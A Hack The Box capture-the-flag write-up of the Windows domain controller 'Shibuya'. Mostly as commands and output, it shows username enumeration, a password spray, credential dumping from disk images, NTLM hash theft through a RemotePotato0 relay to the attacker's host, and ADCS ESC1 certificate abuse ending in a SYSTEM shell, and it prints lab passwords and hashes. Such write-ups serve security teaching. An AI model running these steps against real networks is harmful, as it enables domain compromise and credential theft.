---
tags:
  - HTB
  - Boot2Root
  - Hacking
  - Windows
  - Cross-Session-Relay-Attack
  - ADCS
  - ESC-1
  - RemotePotato0
---
# Overview

| Name        | Shibuya   |
| ----------- | --------- |
| OS          | Windows   |
| Base Points | Hard [40] |
| Status      | Done      |
# Recon
## Nmap

```bash
┌─[us-dedivip-2]─[10.10.15.6]─[at0mxploit@htb-ufsgigx3lb]─[~]
└──╼ [★]$ sudo nmap -sC -sV 10.129.234.42 -T4
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-30 00:27 CST
Stats: 0:00:26 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 72.73% done; ETC: 00:27 (0:00:05 remaining)
Nmap scan report for 10.129.234.42
Host is up (0.27s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH for_Windows_9.5 (protocol 2.0)
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-12-30 06:27:24Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: shibuya.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=AWSJPDC0522.shibuya.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:AWSJPDC0522.shibuya.vl
| Not valid before: 2025-02-15T07:26:20
|_Not valid after:  2026-02-15T07:26:20
|_ssl-date: TLS randomness does not represent time
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: shibuya.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=AWSJPDC0522.shibuya.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:AWSJPDC0522.shibuya.vl
| Not valid before: 2025-02-15T07:26:20
|_Not valid after:  2026-02-15T07:26:20
|_ssl-date: TLS randomness does not represent time
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: SHIBUYA
|   NetBIOS_Domain_Name: SHIBUYA
|   NetBIOS_Computer_Name: AWSJPDC0522
|   DNS_Domain_Name: shibuya.vl
|   DNS_Computer_Name: AWSJPDC0522.shibuya.vl
|   DNS_Tree_Name: shibuya.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2025-12-30T06:28:09+00:00
| ssl-cert: Subject: commonName=AWSJPDC0522.shibuya.vl
| Not valid before: 2025-12-29T06:25:45
|_Not valid after:  2026-06-30T06:25:45
|_ssl-date: 2025-12-30T06:28:48+00:00; 0s from scanner time.
Service Info: Host: AWSJPDC0522; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-12-30T06:28:09
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
```

```bash
echo "10.129.234.42 shibuya.vl AWSJPDC0522.shibuya.vl" | sudo tee -a /etc/hosts
```
# Enumeration

```bash
$ ./kerbrute userenum --dc 10.129.234.42 -d shibuya.vl /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 12/30/25 - Ronnie Flathers @ropnop

2025/12/30 00:31:41 >  Using KDC(s):
2025/12/30 00:31:41 >  	10.129.234.42:88

2025/12/30 00:31:44 >  [+] VALID USERNAME:	 purple@shibuya.vl
2025/12/30 00:31:49 >  [+] VALID USERNAME:	 red@shibuya.vl
```

Having identified valid usernames, the next logical step was to test for weak or common passwords. The tool `netexec` was used to perform a password spray, which confirmed that the user `red` had a password of `red`. This provided the initial valid credential set.

```bash
┌─[us-dedivip-2]─[10.10.15.6]─[at0mxploit@htb-ufsgigx3lb]─[~/kerbrute]
└──╼ [★]$ netexec smb shibuya.vl -u red -p red -k
SMB         shibuya.vl      445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:False)
SMB         shibuya.vl      445    AWSJPDC0522      [+] shibuya.vl\red:red 
```

```bash
┌─[us-dedivip-2]─[10.10.15.6]─[at0mxploit@htb-ufsgigx3lb]─[~/kerbrute]
└──╼ [★]$ netexec smb shibuya.vl -u red -p red -k --users
SMB         shibuya.vl      445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:False)
SMB         shibuya.vl      445    AWSJPDC0522      [+] shibuya.vl\red:red 



SMB         shibuya.vl      445    AWSJPDC0522      -Username-                    -Last PW Set-       -BadPW- -Description-           
SMB         shibuya.vl      445    AWSJPDC0522      _admin                        2025-02-15 07:55:29 0       Built-in account for administering the computer/domain
SMB         shibuya.vl      445    AWSJPDC0522      Guest                         <never>             0       Built-in account for guest access to the computer/domain
SMB         shibuya.vl      445    AWSJPDC0522      krbtgt                        2025-02-15 07:24:57 0       Key Distribution Center Service Account
SMB         shibuya.vl      445    AWSJPDC0522      svc_autojoin                  2025-02-15 07:51:49 0       K5&A6Dw9d8jrKWhV
```

This enumeration revealed a significant security misconfiguration: the password for the service account `svc_autojoin`, was stored in plain text in its Active Directory description field.

```bash
┌─[us-dedivip-2]─[10.10.15.6]─[at0mxploit@htb-ufsgigx3lb]─[~/kerbrute]
└──╼ [★]$ smbclient -L //shibuya.vl/ -U svc_autojoin
Password for [WORKGROUP\svc_autojoin]: K5&A6Dw9d8jrKWhV

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	images$         Disk      
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
	users           Disk      
```

```bash
┌─[us-dedivip-2]─[10.10.15.6]─[at0mxploit@htb-ufsgigx3lb]─[~/kerbrute]
└──╼ [★]$ smbclient //shibuya.vl/images$ -U svc_autojoin  
Password for [WORKGROUP\svc_autojoin]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Feb 16 05:24:08 2025
  ..                                DHS        0  Tue Apr  8 19:09:45 2025
  AWSJPWK0222-01.wim                  A  8264070  Sun Feb 16 05:23:41 2025
  AWSJPWK0222-02.wim                  A 50660968  Sun Feb 16 05:23:45 2025
  AWSJPWK0222-03.wim                  A 32065850  Sun Feb 16 05:23:47 2025
  vss-meta.cab                        A   365686  Sun Feb 16 05:22:37 2025

		5048575 blocks of size 4096. 1564657 blocks available
```

Inside the share, several Windows Imaging Format (`.wim`) files were discovered. These files are disk images and can contain entire offline operating systems, including sensitive files like registry hives.

```bash
┌─[us-dedivip-2]─[10.10.15.6]─[at0mxploit@htb-ufsgigx3lb]─[~/kerbrute]
└──╼ [★]$ sudo mkdir -p /mnt/images
┌─[us-dedivip-2]─[10.10.15.6]─[at0mxploit@htb-ufsgigx3lb]─[~/kerbrute]
└──╼ [★]$ sudo mount -t cifs //10.129.234.42/images$ /mnt/images -o 'username=svc_autojoin,password=K5&A6Dw9d8jrKWhV,vers=2.0'
┌─[us-dedivip-2]─[10.10.15.6]─[at0mxploit@htb-ufsgigx3lb]─[~]
└──╼ [★]$ cp /mnt/images/AWSJPWK0222-02.wim .
```

Once mounted, the `.wim` file was copied locally. The contents of the image were then extracted using `7z`, specifically targeting the SAM, SYSTEM, and SECURITY registry hives, which store local user credentials and system security information.

```bash
7z e AWSJPWK0222-02.wim SAM SYSTEM SECURITY
```

```bash
┌─[us-dedivip-2]─[10.10.15.6]─[at0mxploit@htb-ufsgigx3lb]─[~]
└──╼ [★]$ impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x2e971736685fc53bfd5106d471e2f00f
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8dcb5ed323d1d09b9653452027e8c013:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:9dc1b36c1e31da7926d77ba67c654ae6:::
operator:1000:aad3b435b51404eeaad3b435b51404ee:5d8c3d1a20bd63f60f469f6763ca0d50:::
[*] Dumping cached domain logon information (domain/username:hash)
SHIBUYA.VL/Simon.Watson:$DCC2$10240#Simon.Watson#04b20c71b23baf7a3025f40b3409e325: (2025-02-16 11:17:56+00:00)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
$MACHINE.ACC:plain_password_hex:2f006b004e0045004c0045003f0051005800290040004400580060005300520079002600610027002f005c002e002e0053006d0037002200540079005e0044003e004e0056005f00610063003d00270051002e00780075005b0075005c00410056006e004200230066004a0029006f007a002a005700260031005900450064003400240035004b0079004d006f004f002100750035005e0043004e002500430050006e003a00570068005e004e002a0076002a0043005a006c003d00640049002e006d005a002d002d006e0056002000270065007100330062002f00520026006b00690078005b003600670074003900
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:1fe837c138d1089c9a0763239cd3cb42
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xb31a4d81f2df440f806871a8b5f53a15de12acc1
dpapi_userkey:0xe14c10978f8ee226cbdbcbee9eac18a28b006d06
[*] NL$KM 
 0000   92 B9 89 EF 84 2F D6 55  73 67 31 8F E0 02 02 66   ...../.Usg1....f
 0010   F9 81 42 68 8C 3B DF 5D  0A E5 BA F2 4A 2C 43 0E   ..Bh.;.]....J,C.
 0020   1C C5 4F 40 1E F5 98 38  2F A4 17 F3 E9 D9 23 E3   ..O@...8/.....#.
 0030   D1 49 FE 06 B3 2C A1 1A  CB 88 E4 1D 79 9D AE 97   .I...,......y...
NL$KM:92b989ef842fd6557367318fe0020266f98142688c3bdf5d0ae5baf24a2c430e1cc54f401ef598382fa417f3e9d923e3d149fe06b32ca11acb88e41d799dae97
[*] Cleaning up... 
```
# Lateral Movement

I’ve got 500 users and five NTLM hashes. Of the three non-empty passwords, the operator account is most likely to be reused, then Administrator, then WDAGUtilityAccount. I’ll start by spraying the operator hash, and it gets a hit.

`5d8c3d1a20bd63f60f469f6763ca0d50`

```bash
┌─[us-dedivip-2]─[10.10.15.6]─[at0mxploit@htb-ufsgigx3lb]─[/usr/share/doc/python3-impacket/examples]
└──╼ [★]$ crackmapexec smb 10.129.234.42 -u Simon.Watson -H 5d8c3d1a20bd63f60f469f6763ca0d50
SMB         10.129.234.42   445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:False)
SMB         10.129.234.42   445    AWSJPDC0522      [+] shibuya.vl\Simon.Watson:5d8c3d1a20bd63f60f469f6763ca0d50 
```

```bash
┌─[us-dedivip-2]─[10.10.15.6]─[at0mxploit@htb-ufsgigx3lb]─[/usr/share/doc/python3-impacket/examples]
└──╼ [★]$ python3 /usr/share/doc/python3-impacket/examples/changepasswd.py shibuya.vl/simon.watson@shibuya.vl -hashes :5d8c3d1a20bd63f60f469f6763ca0d50 -newpass Password123
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[*] Changing the password of shibuya.vl\simon.watson
[*] Connecting to DCE/RPC as shibuya.vl\simon.watson
[*] Password was changed successfully.
```

```bash
┌─[us-dedivip-2]─[10.10.15.6]─[at0mxploit@htb-ufsgigx3lb]─[/usr/share/doc/python3-impacket/examples]
└──╼ [★]$ ssh simon.watson@shibuya.vl
The authenticity of host 'shibuya.vl (10.129.234.42)' can't be established.
ED25519 key fingerprint is SHA256:SiXhmjQMScl7eQgH4/uyVXXTsCHM6diy6fh80l4zzJQ.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'shibuya.vl' (ED25519) to the list of known hosts.
simon.watson@shibuya.vl's password: Password123

Microsoft Windows [Version 10.0.20348.3453]
(c) Microsoft Corporation. All rights reserved.

shibuya\simon.watson@AWSJPDC0522 C:\Users\simon.watson>ls Desktop
'ls' is not recognized as an internal or external command,
operable program or batch file.

shibuya\simon.watson@AWSJPDC0522 C:\Users\simon.watson>dir Desktop
 Volume in drive C has no label.
 Volume Serial Number is 46FF-CF3D

 Directory of C:\Users\simon.watson\Desktop

04/08/2025  04:06 PM    <DIR>          .
02/18/2025  11:36 AM    <DIR>          ..
04/08/2025  04:06 PM                32 user.txt
               1 File(s)             32 bytes
               2 Dir(s)   6,406,582,272 bytes free

shibuya\simon.watson@AWSJPDC0522 C:\Users\simon.watson>type Desktop\user.txt
73531560a013b61326392eba28efc261
```
# Privilege Escalation

Setup a Socks proxy.

```bash
ssh simon.watson@shibuya.vl -D1080 -N
```

The BloodHound data revealed that another user, `nigel.mills`, had an active session on the domain controller. This presented an opportunity for a session-based attack.

```bash
┌──(toothless5143㉿kali)-[~]  
└─$ proxychains4 -q bloodhound-python -u simon.watson -p Password123 -ns 10.10.83.243 -d shibuya.vl -c All --zip  
  
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)  
INFO: Found AD domain: shibuya.vl  
INFO: Getting TGT for user  
INFO: Connecting to LDAP server: awsjpdc0522.shibuya.vl  
INFO: Found 1 domains  
INFO: Found 1 domains in the forest  
INFO: Found 4 computers  
INFO: Connecting to LDAP server: awsjpdc0522.shibuya.vl  
INFO: Found 504 users  
INFO: Found 58 groups  
INFO: Found 2 gpos  
INFO: Found 2 ous  
INFO: Found 19 containers  
INFO: Found 0 trusts  
INFO: Starting computer enumeration with 10 workers  
INFO: Querying computer: AWSJPWK0222.shibuya.vl  
INFO: Querying computer:  
INFO: Querying computer:  
INFO: Querying computer: AWSJPDC0522.shibuya.vl  
WARNING: Could not resolve: AWSJPWK0222.shibuya.vl: The DNS query name does not exist: AWSJPWK0222.shibuya.vl.  
INFO: Done in 00M 45S  
INFO: Compressing output into 20250529155505_bloodhound.zip
```

I’ll need the session ID for the target user. Typically I’d get this with `qwinsta`, but just like in Rebound, it doesn’t work:

```bash
PS C:\ProgramData> qwinsta *
No session exists for *
```

That’s because I have a non-interactive session. I’ll upload [RunasCs.exe](https://github.com/antonioCoco/RunasCs) and use it with a login type 9 login:

```bash
PS C:\ProgramData> .\RunasCs.exe whatever whatever qwinsta -l 9

 SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE 
>services                                    0  Disc
 rdp-tcp#0         nigel.mills               1  Active
 console                                     2  Conn
 rdp-tcp                                 65536  Listen
```

For type 9 logins it doesn’t actually check the creds, but I need to put something into those arguments. nigel.mills is connected over RDP in session ID 1.
## Cross Session Relay Attack

The [RemotePotato0](https://github.com/antonioCoco/RemotePotato0/releases) tool was uploaded to the server to perform a Cross-Session Relay attack. A Cross-Session Relay attack in Active Directory is a sophisticated technique that leverages an existing, legitimate user's session on a machine to gain unauthorized access to other resources on the network. It's a specialized form of an NTLM relay attack.

To facilitate this, a `socat` listener was set up on the attacker's machine to redirect traffic from the victim server, which is a necessary step for the exploit.

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-ksvfx4vvki]─[~]
└──╼ [★]$ sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:10.129.234.42:9000
```

The `socat` command creates a **fake port 135** that tricks Windows into thinking it's talking to itself.

1. **Windows tries to talk to port 135** (normal RPC traffic)
2. **Your socat catches it** and sends it to port 9000
3. **RemotePotato0 listens on 9000** and processes the authentication
4. **You get the NTLM hash** from the intercepted traffic

```bash
scp RemotePotato0.exe "simon.watson@shibuya.vl:C:\\Users\\simon.watson\\Desktop\\"
```

After uploading `RemotePotato0` to the server, it was executed to capture the NTLMv 2 hash from `nigel.mills` 's active session.

```bash
.\RemotePotato0.exe -m 2 -r 10.10.15.108 -x 10.10.15.108 -p 9000 -s 1  
[*] Detected a Windows Server version not compatible with JuicyPotato. RogueOxidResolver must be run remotely. Remember to forward tcp port 135 on 10.10.15.108 to your victim machine on port 9000
[*] Example Network redirector:
        sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:{{ThisMachineIp}}:9000
[*] Starting the RPC server to capture the credentials hash from the user authentication!!
[*] RPC relay server listening on port 9997 ...
[*] Spawning COM object in the session: 1
[*] Calling StandardGetInstanceFromIStorage with CLSID:{5167B42F-C111-47A1-ACC4-8EABE61B0B54}
[*] Starting RogueOxidResolver RPC Server listening on port 9000 ...
[*] IStoragetrigger written: 106 bytes
[*] ServerAlive2 RPC Call
[*] ResolveOxid2 RPC call
[+] Received the relayed authentication on the RPC relay server on port 9997
[*] Connected to RPC Server 127.0.0.1 on port 9000
[+] User hash stolen!

NTLMv2 Client   : AWSJPDC0522
NTLMv2 Username : SHIBUYA\Nigel.Mills
NTLMv2 Hash     : Nigel.Mills::SHIBUYA:2537fca5c7de2625:582feb504e5e891635a1c92afdbf0e8e:0101000000000000c0f8ec303b7ddc0160886aa348bb95c10000000002000e005300480049004200550059004100010016004100570053004a0050004400430030003500320032000400140073006800690062007500790061002e0076006c0003002c004100570053004a0050004400430030003500320032002e0073006800690062007500790061002e0076006c000500140073006800690062007500790061002e0076006c0007000800c0f8ec303b7ddc010600040006000000080030003000000000000000010000000020000039970898510d874172c170d9a3913fb9501ae411abe21e14df1b720dca88eb3c0a00100000000000000000000000000000000000090000000000000000000000
```

- `-m 2` → Attack method
- `-r` & `-x 10.10.15.108` → Your Kali IP
- `-p 9000` → Port for the attack
- `-s 1` → Nigel's session ID

Upon cracking the hash we get It cracks to “Sail2Boat3” very quickly.

```bash
sshpass -p 'Sail2Boat3' ssh nigel.mills@shibuya.vl
```
## ESC 1

```powershell
.\certify.exe enum-templates --filter-enabled 
<SNIPPED>
    Template Name                         : ShibuyaWeb
    Enabled                               : True
    Publishing CAs                        : AWSJPDC0522.shibuya.vl\shibuya-AWSJPDC0522-CA
    Schema Version                        : 2
    Validity Period                       : 100 years
    Renewal Period                        : 75 years
    Certificate Name Flag                 : ENROLLEE_SUPPLIES_SUBJECT
    Enrollment Flag                       : NONE
    Manager Approval Required             : False
    Authorized Signatures Required        : 0
    Extended Key Usage                    : Any Purpose, Server Authentication
    Certificate Application Policies      : Any Purpose, Server Authentication
    Permissions
      Enrollment Permissions
        Enrollment Rights           : SHIBUYA\Domain Admins              S-1-5-21-87560095-894484815-3652015022-512
                                      SHIBUYA\Enterprise Admins          S-1-5-21-87560095-894484815-3652015022-519
                                      SHIBUYA\t1_admins                  S-1-5-21-87560095-894484815-3652015022-1103        
      Object Control Permissions
        Owner                       : SHIBUYA\_admin                     S-1-5-21-87560095-894484815-3652015022-500
        Write Owner                 : SHIBUYA\_admin                     S-1-5-21-87560095-894484815-3652015022-500
                                      SHIBUYA\Domain Admins              S-1-5-21-87560095-894484815-3652015022-512
                                      SHIBUYA\Enterprise Admins          S-1-5-21-87560095-894484815-3652015022-519
        Write Dacl                  : SHIBUYA\_admin                     S-1-5-21-87560095-894484815-3652015022-500
                                      SHIBUYA\Domain Admins              S-1-5-21-87560095-894484815-3652015022-512
                                      SHIBUYA\Enterprise Admins          S-1-5-21-87560095-894484815-3652015022-519
        Write Property              : SHIBUYA\_admin                     S-1-5-21-87560095-894484815-3652015022-500
                                      SHIBUYA\Domain Admins              S-1-5-21-87560095-894484815-3652015022-512
                                      SHIBUYA\Enterprise Admins          S-1-5-21-87560095-894484815-3652015022-519
```

Even without noticing this certificate is vulnerable to ESC1, I can run [Certipy](https://github.com/ly4k/Certipy) to check for vulnerabilities in the accessible certificates.

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-ksvfx4vvki]─[~]
└──╼ [★]$ ssh -D 1080 -N nigel.mills@shibuya.vl
# Enter password: Sail2Boat3
nigel.mills@shibuya.vl's password: 
```

```bash
proxychains -q certipy find -vulnerable -u 'nigel.mills' -p 'Sail2Boat3' -dc-ip 10.129.234.42
<SNIPPED>
  0
    Template Name                       : ShibuyaWeb
    Display Name                        : ShibuyaWeb
    Certificate Authorities             : shibuya-AWSJPDC0522-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : True
    Any Purpose                         : True
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Any Purpose
                                          Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 100 years
    Renewal Period                      : 75 years
    Minimum RSA Key Length              : 4096
    Template Created                    : 2025-02-15T07:37:49+00:00
    Template Last Modified              : 2025-02-19T10:58:41+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : SHIBUYA.VL\t1_admins
                                          SHIBUYA.VL\Domain Admins
                                          SHIBUYA.VL\Enterprise Admins
      Object Control Permissions
        Owner                           : SHIBUYA.VL\_admin
        Full Control Principals         : SHIBUYA.VL\Domain Admins
                                          SHIBUYA.VL\Enterprise Admins
        Write Owner Principals          : SHIBUYA.VL\Domain Admins
                                          SHIBUYA.VL\Enterprise Admins
        Write Dacl Principals           : SHIBUYA.VL\Domain Admins
                                          SHIBUYA.VL\Enterprise Admins
        Write Property Enroll           : SHIBUYA.VL\Domain Admins
                                          SHIBUYA.VL\Enterprise Admins
    [+] User Enrollable Principals      : SHIBUYA.VL\t1_admins
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.
      ESC2                              : Template can be used for any purpose.
      ESC3                              : Template has Certificate Request Agent EKU set.
```

`certipy` immediately picks it up as `ESC1` - `ESC3`

First try:

```bash
certipy req -u 'nigel.mills@shibuya.vl' -p 'Sail2Boat3' -dc-ip 10.129.234.42 -target AWSJPDC0522.shibuya.vl -ca 'shibuya-AWSJPDC0522-CA' -template ShibuyaWeb -upn _admin@shibuya.vl -sid S-1-5-21-87560095-894484815-3652015022-500
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 5
[-] Got error while requesting certificate: code: 0x80094811 - CERTSRV_E_KEY_LENGTH - The public key does not meet the minimum size re
```

We get an error about key length. We see it is expected to have a key-size of `4096`. After adding this size it worked:

```bash
certipy req -u 'nigel.mills@shibuya.vl' -p 'Sail2Boat3' -dc-ip 10.129.234.42 -target AWSJPDC0522.shibuya.vl -ca 'shibuya-AWSJPDC0522-CA' -template ShibuyaWeb -upn _admin@shibuya.vl -sid S-1-5-21-87560095-894484815-3652015022-500 -key-size 4096
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 7
[*] Successfully requested certificate
[*] Got certificate with UPN '_admin@shibuya.vl'
[*] Certificate object SID is 'S-1-5-21-87560095-894484815-3652015022-500'
[*] Saving certificate and private key to '_admin.pfx'
[*] Wrote certificate and private key to '_admin.pfx'
```

Note: we needed to use `_admin` and its SID, as it is the only Domain admin account in this domain, the default `Administrator` seems to be deleted. I can not fully explain why it works here, but not with `certify`. My guess is, that from windows there were some additional checks against the enrollment.

Authentication to get the TGT / NTLM-Hash is successful:

```bash
certipy auth -pfx _admin.pfx -dc-ip 10.129.234.42  
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: '_admin@shibuya.vl'
[*]     SAN URL SID: 'S-1-5-21-87560095-894484815-3652015022-500'
[*]     Security Extension SID: 'S-1-5-21-87560095-894484815-3652015022-500'
[*] Using principal: '_admin@shibuya.vl'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to '_admin.ccache'
[*] Wrote credential cache to '_admin.ccache'
[*] Trying to retrieve NT hash for '_admin'
[*] Got hash for '_admin@shibuya.vl': aad3b435b51404eeaad3b435b51404ee:bab5b2a004eabb11d865f31912b6b430
```

With the hash obtained we simply could use `smbexec.py` to get full access:

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-ksvfx4vvki]─[~]
└──╼ [★]$ smbexec.py shibuya.vl/_admin:@10.129.234.42 -hashes :bab5b2a004eabb11d865f31912b6b430  
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
5b150cc71e974d37624299cdd83798f1
```

---